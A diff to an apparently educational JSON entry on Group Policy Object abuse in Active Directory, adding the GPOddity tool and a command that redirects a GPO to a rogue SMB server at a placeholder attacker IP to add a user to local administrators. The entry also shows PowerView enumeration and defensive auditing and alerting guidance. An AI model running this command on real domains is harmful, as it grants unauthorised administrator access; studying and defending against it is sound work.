@@ -17,14 +17,16 @@
   ],
   "tools": [
     "PowerView",
-    "SharpGPOAbuse"
+    "SharpGPOAbuse",
+    "GPOddity"
   ],
   "tags": [
     "gpo",
     "group-policy",
     "privesc",
     "persistence",
-    "sharpgpoabuse"
+    "sharpgpoabuse",
+    "gpoddity"
   ],
   "steps": [
     {
@@ -83,5 +85,11 @@
     "misconfiguration": "Non-admin groups have write permissions on GPOs (often from legacy delegation or mis-scoped admin roles). No Event 5136 monitoring on GPO objects. GPO DACLs not regularly audited.",
     "vulnerable_config": "# Find GPOs with non-admin write permissions:\nGet-NetGPO | ForEach-Object {\n  $gpo = $_\n  Get-ObjectAcl $gpo.AdsPath -ResolveGUIDs | Where-Object {\n    $_.ActiveDirectoryRights -match 'Write|Create|GenericAll' -and\n    $_.IdentityReference -notmatch 'Domain Admins|CREATOR OWNER|SYSTEM|Enterprise Admins'\n  } | Select-Object @{N='GPO';E={$gpo.DisplayName}},IdentityReference,ActiveDirectoryRights\n}\n# Output: 'IT_Computers_GPO' \u2014 CORP\\HelpDesk \u2014 WriteProperty \u2192 VULNERABLE",
     "secure_config": "# Remove non-admin write ACEs from GPOs:\n# GPMC \u2192 right-click GPO \u2192 Edit Delegations \u2192 remove non-admin edit rights\n\n# Audit GPO DACLs with BloodHound:\n# Cypher: MATCH (g:GPO) WHERE g.owned=true RETURN g.name\n# Or: 'Find GPOs where Domain Users have Modify Rights' built-in query\n\n# Enable Event 5136 on GPO objects:\n# Advanced Audit: DS Access \u2192 Audit Directory Service Changes\n# SIEM: EventID=5136 AND ObjectDN contains 'CN=Policies,CN=System' \u2192 ALERT\n\n# Change control: require ITSM ticket for GPO modifications\n# Only GPO admins (dedicated group) have write rights \u2014 review quarterly"
-  }
+  },
+  "variations": [
+    {
+      "label": "Abuse via GPOddity (Linux/WSL, lab method)",
+      "command": "sudo python3 gpoddity.py --gpo-id '<gpo_id>' --domain '<domain>' --username '<user>' --password '<pass>' --command 'net localgroup administrators <user> /add' --rogue-smbserver-ip '<attacker_ip>' --rogue-smbserver-share '<share>' --dc-ip '<dc_ip>' --smb-mode none"
+    }
+  ]
 }
